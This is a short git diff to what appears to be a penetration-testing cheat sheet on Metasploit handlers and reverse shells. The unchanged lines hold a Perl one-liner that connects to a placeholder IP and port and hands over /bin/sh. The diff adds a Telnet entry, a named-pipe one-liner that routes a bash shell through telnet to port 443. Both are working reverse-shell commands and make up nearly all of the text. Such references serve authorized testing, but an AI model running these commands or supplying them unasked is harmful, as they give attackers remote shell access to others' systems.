@@ -516,6 +516,10 @@ Metasploit handlers can be great at quickly setting up Metasploit to be in a pos
 	perl: exec "/bin/sh";
 	
 	perl -e 'use Socket;$i="<[IP]>";$p=<[PORT]>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+<b>Telnet:</b>
+
+	mknod /tmp/yyy p && /bin/bash 0</tmp/yyy | telnet 127.0.0.1 443 1>/tmp/yyy
 	
 <b>Ruby:</b>
 	
